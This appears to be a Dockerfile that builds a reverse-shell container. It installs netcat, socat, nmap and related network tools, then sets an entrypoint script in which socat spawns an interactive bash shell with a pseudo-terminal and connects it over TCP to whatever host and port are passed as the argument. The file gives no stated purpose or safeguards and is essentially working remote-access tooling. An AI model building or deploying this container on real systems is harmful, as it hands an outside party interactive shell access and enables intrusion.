FROM python:slim

RUN apt-get update && \
    apt-get install -y net-tools curl ssh iputils-ping netcat socat nmap groff build-essential

RUN echo '#!/bin/bash' > /docker-entrypoint.sh && \
    echo 'socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$1' >> /docker-entrypoint.sh && \
    chmod +x /docker-entrypoint.sh

ENTRYPOINT [ "/docker-entrypoint.sh" ]